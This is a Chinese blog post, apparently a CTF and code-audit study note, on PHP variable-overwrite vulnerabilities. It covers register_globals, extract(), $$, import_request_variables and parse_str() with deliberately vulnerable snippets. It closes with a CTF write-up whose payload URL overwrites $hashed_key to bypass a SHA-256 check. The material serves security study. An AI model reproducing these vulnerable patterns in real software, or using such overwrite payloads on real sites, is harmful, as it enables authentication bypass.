---
title: "PHP变量覆盖总结"
date: 2019-05-09T13:09:07+08:00
draft: false
tags: ['ctf','php']
categories: ['代码审计']
---

最近做ctf遇到了很多次变量覆盖的问题，总结一下

<!--more-->

## register_global

全局变量注册，本特性已自 PHP 5.3.0 起**废弃**并将自 PHP 5.4.0 起**移除**。

当在php.ini开启register_globals= On时，代码中的参数会被用户提交的参数覆盖掉。

看例子

```php
<?php
echo "Register_globals: " . (int)ini_get("register_globals") . "<br/>";
if ($auth) {
    echo "覆盖！";
}else{
    echo "没有覆盖";
}
```

当访问`http://127.0.0.1/1.php`时输出`没有覆盖`

但是当请求`http://127.0.0.1/1.php?auth=1`时会覆盖掉`$auth`输出`覆盖`。
## extract()
从数组中将变量导入到当前的符号表
直接看代码
```php
<?php
$auth=false;
extract($_GET);

if ($auth){
    echo "over";
}
```
同样请求`http://127.0.0.1/1.php?auth=1`时会覆盖掉`$auth`输出`over`。
## `$$`
`$$`符号在php中叫做`可变变量`，可以使变量名动态设置。举个例子

```php
<?php
$a='hello';
$$a='world';
echo "$a ${$a}";
echo "$a $hello";
?>
```
可以看到在这里`${$a}`等同于`$hello`，接着我们再来看怎么来进行变量覆盖

```php
$auth=0;
foreach ($_GET as $key => $value) {
    $$key=$value;
}
echo $auth;
```
在第二行中遍历了全局变量`$_GET`，第三行将key当作变量名，把value赋值。
那么我们传入`http://127.0.0.1/1.php?auth=1`时会将`$auth`的值覆盖为1

## import_request_variables
将 GET／POST／Cookie 变量导入到全局作用域中，如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。那么和register_globals存在相同的变量覆盖问题。
```php
$auth = '0';
import_request_variables('G');
 
if($auth == 1){
  echo "over!";
}
```
同样传入`http://127.0.0.1/1.php?auth=1`时会将`$auth`的值覆盖为1，输出`over!`
## parse_str()
将字符串解析成多个变量
```php
$a='aa';
$str = "a=test";
parse_str($str);
echo ${a};
```
可以看出来将$str解析为`$a='test'`，与parse_str()类似的函数还有mb_parse_str()，不在赘述。

我们来看一道ctf题，在我[上一篇文章ISCC的web4](https://y4er.com/post/iscc-2019/#web4)中也提到了.

源代码
```php
<?php 
error_reporting(0); 
include("flag.php"); 
$hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'; 
$parsed = parse_url($_SERVER['REQUEST_URI']); 
if(isset($parsed["query"])){ 
    $query = $parsed["query"]; 
    $parsed_query = parse_str($query); 
    if($parsed_query!=NULL){ 
        $action = $parsed_query['action']; 
    } 

    if($action==="auth"){ 
        $key = $_GET["key"]; 
        $hashed_input = hash('sha256', $key); 
        if($hashed_input!==$hashed_key){ 
            die("no"); 
        } 

        echo $flag; 
    } 
}else{ 
    show_source(__FILE__); 
}?>
```
在第五行将请求的URI通过`parse_url()`解析后赋值给`$parsed`变量。

在第八行将我们提交的`query`参数使用`parse_str`解析，这时就产生了变量覆盖的问题，我们可以通过query提交参数去覆盖变量。

接着往下看`$hashed_input!==$hashed_key`成立输出flag，此时`$hashed_input`我们可控，那么我们可以覆盖掉`$hashed_key`来使条件成立

`$hashed_input = hash('sha256', $key);`是sha256加密，那么我们可以传入`key=a`，此时`$hashed_input`等于`ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb`。

然后覆盖`$hashed_key`，传入`query=&hashed_key=ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb`覆盖掉。

这时payload为
```http
http://39.100.83.188:8066/?query=&hashed_key=ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb&action=auth&key=a
```

拿到flag

## 总结
代码审计中变量覆盖还算好找，希望自己细心，也希望这篇文章对大家有用处。